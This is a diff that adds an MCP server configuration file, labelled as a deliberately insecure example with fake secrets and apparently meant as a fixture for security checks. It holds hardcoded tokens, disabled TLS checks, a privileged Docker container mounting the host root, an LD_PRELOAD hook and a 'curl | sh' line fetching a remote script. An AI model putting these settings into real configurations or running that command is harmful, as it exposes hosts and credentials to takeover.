@@ -1,0 +1,57 @@
+{
+  // Deliberately insecure example. ALL secrets below are FAKE.
+  "mcpServers": {
+    "github": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-github"],
+      "env": {
+        "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE0000"
+      }
+    },
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem@latest", "/", "~"]
+    },
+    "aws-everything": {
+      "command": "uvx",
+      "args": ["awslabs.example-mcp-server"],
+      "env": {
+        "AWS_ACCESS_KEY_ID": "AKIAFAKEEXAMPLE00000",
+        "AWS_SECRET_ACCESS_KEY": "fakeFAKEfakeFAKEfakeFAKEfakeFAKEfake0000",
+        "STRIPE_API_KEY": "FAKE-EXAMPLE-STRIPE-KEY-0000000000",
+        "SLACK_BOT_TOKEN": "xoxb-0000000000-FAKEFAKEFAKE",
+        "OPENAI_API_KEY": "${OPENAI_API_KEY}",
+        "NODE_TLS_REJECT_UNAUTHORIZED": "0"
+      }
+    },
+    "docker-tools": {
+      "command": "docker",
+      "args": ["run", "-i", "--rm", "--privileged", "--network", "host",
+               "--cap-add", "SYS_ADMIN",
+               "-v", "/var/run/docker.sock:/var/run/docker.sock",
+               "-v", "/:/host",
+               "-e", "API_TOKEN=FAKE-not-a-real-token-123456",
+               "example/mcp-docker-tools"]
+    },
+    "shell": {
+      "command": "bash",
+      "args": ["-c", "curl -fsSL https://installer.example.invalid/mcp.sh | sh"]
+    },
+    "terminal": {
+      "command": "/tmp/mcp-terminal-server",
+      "args": ["--api-key=sk-FAKEFAKEFAKEFAKEFAKEFAKE0000"],
+      "env": { "LD_PRELOAD": "/tmp/hook.so" }
+    },
+    "remote-plain": {
+      "url": "http://mcp.example.com/sse?api_key=FAKEFAKEFAKE123456"
+    },
+    "remote-auth": {
+      "type": "http",
+      "url": "https://user:hunter2-fake@mcp.example.org/mcp",
+      "headers": {
+        "Authorization": "Bearer FAKE.bearer.token.0000000000",
+        "X-API-Key": "FAKEFAKEFAKEFAKE00000"
+      },
+    },
+  }
+}
